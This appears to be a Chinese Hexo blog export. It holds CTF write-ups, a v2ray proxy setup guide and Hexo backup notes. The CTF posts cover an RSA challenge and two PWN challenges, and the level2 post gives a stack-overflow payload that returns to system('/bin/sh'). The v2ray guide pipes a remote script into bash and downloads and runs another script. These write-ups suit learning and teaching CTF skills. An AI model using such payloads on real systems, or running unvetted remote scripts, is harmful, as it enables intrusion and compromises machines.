        <content type="html"><![CDATA[<a id="more"></a><h1 id="RSA解密"><a href="#RSA解密" class="headerlink" title="RSA解密"></a>RSA解密</h1><p><code>openssl rsa -pubin -text -modulus -in warmup pub.pem</code></p><p>可以解出e和N。</p><p><a href="http://factordb.com/%E9%80%9A%E8%BF%87%E8%AF%A5%E7%BD%91%E7%AB%99%EF%BC%8C%E8%BE%93%E5%85%A5N%EF%BC%8C%E5%BE%97%E5%88%B0p%E5%92%8Cq%E3%80%82">http://factordb.com/通过该网站，输入N，得到p和q。</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">computeD</span>(<span class="params">fn, e</span>):</span></span><br><span class="line">    (x, y, r) = extendedGCD(fn, e)</span><br><span class="line">    <span class="comment"># y maybe &lt; 0, so convert it</span></span><br><span class="line">    <span class="keyword">if</span> y &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> fn + y</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extendedGCD</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="comment"># a*xi + b*yi = ri</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, <span class="number">0</span>, a)</span><br><span class="line">    <span class="comment"># a*x1 + b*y1 = a</span></span><br><span class="line">    x1 = <span class="number">1</span></span><br><span class="line">    y1 = <span class="number">0</span></span><br><span class="line">    <span class="comment"># a*x2 + b*y2 = b</span></span><br><span class="line">    x2 = <span class="number">0</span></span><br><span class="line">    y2 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        q = a / b</span><br><span class="line">        <span class="comment">#ri = r(i-2) % r(i-1)</span></span><br><span class="line">        r = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = r</span><br><span class="line">        <span class="comment">#xi = x(i-2) - q*x(i-1)</span></span><br><span class="line">        x = x1 - q * x2</span><br><span class="line">        x1 = x2</span><br><span class="line">        x2 = x</span><br><span class="line">        <span class="comment">#yi = y(i-2) - q*y(i-1)</span></span><br><span class="line">        y = y1 - q * y2</span><br><span class="line">        y1 = y2</span><br><span class="line">        y2 = y</span><br><span class="line">    <span class="keyword">return</span>(x1, y1, a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q = <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">fn = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = computeD(fn, e)</span><br><span class="line"><span class="built_in">print</span> d</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过上面的脚本可以得到d。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> PublicKey</span><br><span class="line">arsa = PublicKey.RSA.generate(<span class="number">1024</span>)</span><br><span class="line">arsa.p = <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">arsa.q = <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">arsa.e = <span class="number">65537</span></span><br><span class="line">arsa.n = arsa.p * arsa.q</span><br><span class="line">Fn = long((arsa.p - <span class="number">1</span>) * (arsa.q - <span class="number">1</span>))</span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    x = (Fn * i) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(x % arsa.e == <span class="number">0</span>):</span><br><span class="line">        arsa.d = x / arsa.e</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;private.pem&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> private:</span><br><span class="line">    private.write(arsa.exportKey())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在kali中，通过上面的脚本可以生成private.pem。</p><p>输入<code>openssl</code>进入工作空间，输入<code>rsautl -decrypt -in flag.enc -inkey private.pem</code>，可解出明文。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界PWN新手题——level2</title>
      <link href="2019/12/20/20191220201041/"/>
      <url>2019/12/20/20191220201041/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>首先通过file和checksec分析该题的附件。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/Snip20191220_4.png"></p><p>判断该文件是32位的ELF文件，只开启了不可执行的保护。</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>开始进行反汇编，用IDA 32位。</p><p>通过左侧的函数窗口发现，只有main、vulnerable_function可用，因此进行分析，两个函数如下图：</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/Snip20191220_5.png"></p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/Snip20191220_6.png"></p><p>通过分析发现，在main函数中首先调用vulnerable_function，在vulnerable_function中的缓冲区大小为88h，而read函数能够写进缓冲区100h，因此存在栈溢出。</p><p>知道是栈溢出之后就需要找到溢出点：缓冲区大小加上ebp的4个字节后，就是返回地址的位置。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/Snip20191220_9.png"></p><p>发现在ELF文件中存在字符串“/bin/sh”，而且在主函数中最后会再次调用一次system函数，因此判断可以返回最后一次调用的位置。因此构造payload。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">4</span> + p32(<span class="number">0x0804849e</span>) + p32(<span class="number">0x0804a024</span>)</span><br></pre></td></tr></table></figure><p>最后的<code>0x0804a024</code>为<code>/bin/sh</code>的地址。</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>最后的exp为：</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/Snip20191220_10.png"></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/Snip20191220_11.png" alt="image-20191220204140234"></p><p>最后获取到shell，<code>cat flag</code>得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防世界 </tag>
            
            <tag> PWN </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界PWN（level0）</title>
      <link href="2019/12/18/20191218221857/"/>
      <url>2019/12/18/20191218221857/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>首先，进行通过file判断附件文件类型。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20191218220110553.png" alt="image-20191218220110553"></p><p>判断是ELF文件。这时就可以通过checksec判断文件的保护措施。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20191218220211791.png" alt="image-20191218220211791"></p><p>得到只开启了执行保护，地址随机化、栈保护都没有开启。</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>开始IDA逆向分析。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20191218220426947.png" alt="image-20191218220426947"></p><p>在其中发现了main、vulnerable_function、callsystem函数逐个查看这三个函数。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20191218220524755.png" alt="image-20191218220524755"></p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20191218220601881.png" alt="image-20191218220601881"></p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20191218220616595.png" alt="image-20191218220616595"></p><p>发现该题中用到了write、read函数，google一下发现read函数是往内存里面写，而且发现大小为0x200大小，比0x80大的多，所以想到栈溢出，而且有callsystem函数（地址为0x400596）能够直接得到shell。</p><p>最终，确定了通过栈溢出执行callsystem从而得到shell。</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>编写exp。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20191218221333336.png" alt="image-20191218221333336"></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>得到flag。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20191218221438956.png" alt="image-20191218221438956"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防世界 </tag>
            
            <tag> PWN </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>v2ray的搭建过程</title>
      <link href="2019/11/22/20191122004901/"/>
      <url>2019/11/22/20191122004901/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-VPS"><a href="#0x00-VPS" class="headerlink" title="0x00 VPS"></a>0x00 VPS</h1><p>首先，第一步，是需要一个墙外的VPS，可以从很多VPS商买到。</p><p><a href="https://bandwagonhost.com/"><strong>bandwagonhost.com</strong></a></p><p><a href="https://www.vultr.com/?ref=7775187-4F"><strong>vultr.com</strong></a></p><p>bandwagonhost需翻墙后才能访问，vultr可以支付宝付款。</p><p>还有其他很多VPS商可以购买，不限于上面两家。最好买日本、香港、新加坡的，线路近，延迟低。</p><p>推荐系统的版本是<code>debian9+</code>。</p><h1 id="0x01-v2ray一键脚本"><a href="#0x01-v2ray一键脚本" class="headerlink" title="0x01 v2ray一键脚本"></a>0x01 v2ray一键脚本</h1><p>用的是233boy的一键脚本，方便快捷。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -s -L https://git.io/v2ray.sh)</span><br></pre></td></tr></table></figure><p>安装后按提示，安装、配置就可以了，傻瓜式的，很简单。</p><h1 id="0x02-bbr一键脚本"><a href="#0x02-bbr一键脚本" class="headerlink" title="0x02 bbr一键脚本"></a>0x02 bbr一键脚本</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget -N --no-check-certificate &quot;https://raw.githubusercontent.com/chiakge/Linux-NetSpeed/master/tcp.sh&quot;</span><br><span class="line">chmod +x tcp.sh</span><br><span class="line">./tcp.sh</span><br></pre></td></tr></table></figure><p>油管上发现的，油管主视频测评推荐<code>BBR plus</code>，亲测可以。</p><h1 id="0x03-WS-TLS"><a href="#0x03-WS-TLS" class="headerlink" title="0x03 WS+TLS"></a>0x03 WS+TLS</h1><p>v2ray支持伪装成一个网站。当我们通过代理软件走<code>vmess</code>的代理的话，是翻墙的功能，当我们通过浏览器直接访问域名的话，会给我们返回伪装的网站。</p><p>话不多说，上配置。</p><h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p>首先购买一个域名，将域名解析到你的vps的ip地址上。</p><p>我是在阿里云上购买的域名：</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/Screen Shot 2020-02-13 at 3.27.53 PM.png" style="zoom:50%;"><p>在记录值填入你自己的VPS的IP地址，主机记录里填@。</p><p>之后就是在服务端的脚本中的配置。</p><h3 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h3><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200213153513.png" style="zoom:50%;"><p>选择<code>2.修改v2ray配置</code>。</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200213153545.png" style="zoom:50%;"><p>选择<code>2.修改v2ray传输协议</code>。</p><img src= "/img/loading.gif" data-lazy-src="/Users/optimus/Library/Application Support/typora-user-images/image-20200213153627166.png" alt="image-20200213153627166" style="zoom:50%;"><p>选择<code>4.WebSocket+TLS</code>。</p><p>后面的修改跟着提示来就行了。</p><h1 id="0x04-客户端"><a href="#0x04-客户端" class="headerlink" title="0x04 客户端"></a>0x04 客户端</h1><p>最后就是各种客户端的下载。</p><p><code>Mac OX</code>：<a href="https://github.com/Cenmrev/V2RayX/">v2rayX</a></p><p><code>Windows</code>：<a href="https://github.com/2dust/v2rayN">v2rayN</a></p><p><code>ios</code>：<code>shadowrocket</code></p><p><code>Android</code>：自己找去😂</p>]]></content>
      
      
      <categories>
          
          <category> 杂类问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v2ray </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo搭建博客后的问题</title>
      <link href="2017/09/14/20170914223339/"/>
      <url>2017/09/14/20170914223339/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="1-通过Hexo搭建博客的问题"><a href="#1-通过Hexo搭建博客的问题" class="headerlink" title="1.通过Hexo搭建博客的问题**"></a>1.通过Hexo搭建博客的问题**</h1><p>　　通过<code>Hexo</code>搭建好博客并发布到<code>Git</code>上之后，为了使博客更加方便和没观，一直在不停的优化它。但在优化的过程中遇到了很多的问题。</p><h2 id="1-安装插件的问题"><a href="#1-安装插件的问题" class="headerlink" title="1.安装插件的问题"></a><strong>1.安装插件的问题</strong></h2><p>　　在优化博客的时候，经常会看到别人的博文上让下载插件来提高博客的方便性。我在优化的时候也下载过两次插件，但每次使用后都会发生错误，在<code>Git Bash</code>上输入hexo命令后显示无法找到<code>hexo</code>，让重新下载<code>hexo</code>，如下图。<br>![hexobug][doge]<br>　　因此，在没有必要，没有学习好node.js的时候不要为了追求功能的多样而下载插件。</p><h2 id="2-博客本地文件备份在Github上的问题"><a href="#2-博客本地文件备份在Github上的问题" class="headerlink" title="2.博客本地文件备份在Github上的问题"></a><strong>2.博客本地文件备份在Github上的问题</strong></h2><p>　　在使用的途中，因为各种各样的BUG，经常导致在本地无法运用hexo进行博文的更新和对博客的优化，从而需要重新搭建博客（因为目前的东西还比较少，能够从来的起，所以仅针对刚刚使用hexo的人来说），所以就在想有没有什么办法能够将本地的博文备份。<br>　　一开始想到了百度云盘，但因为云盘有不安全的地方（PS.通过<a href="http://www.panduoduo.net可以查找到云盘用户存放的文件),所以果断放弃,当然还是因为我这种爱搞的人当然不能用这么low的东西.因此,不断在网上找方法./">www.panduoduo.net可以查找到云盘用户存放的文件），所以果断放弃，当然还是因为我这种爱搞的人当然不能用这么low的东西。因此，不断在网上找方法。</a></p><h3 id="通过github来进行备份"><a href="#通过github来进行备份" class="headerlink" title="通过github来进行备份"></a><strong>通过github来进行备份</strong></h3><p>　　1. 在Github下创建一个新的<code>repository</code>，取名为Hexo。(与本地的Hexo源码文件夹同名即可)<br>　　2. 进入本地的Hexo文件夹，执行以下命令创建仓库:<br>　　<code>git init</code><br>　　之后设置远程仓库的地址<br>　　<code>git remote add origin git@github.com:smilexiamo/hexo.git</code><br>　　3. 每次更新完博文之后，将更新推送到github上<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &quot;添加hexo源码文件作为备份&quot;</span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure><br>　　这样就完成了博客的备份</p><h3 id="在新机上重新开始博客的更新"><a href="#在新机上重新开始博客的更新" class="headerlink" title="在新机上重新开始博客的更新"></a><strong>在新机上重新开始博客的更新</strong></h3><p>　　1. 在新机上，载好git、node.js后，创建blog文档，重新执行到<code>hexo init</code>之前的命令。<br>　　2. 创建<code>Hexo</code>文件文件夹执行<br>　　<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">　　git init</span><br><span class="line">　　git clone &quot;git@github.com:overoptimus&#x2F;Hexo.git&quot;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">　　将远程仓库拷贝到本地，这样就可以再次写博文了。</span><br><span class="line">　　注意将仓库地址改为你自己的地址，不然你就拷到我的博客文件了。</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
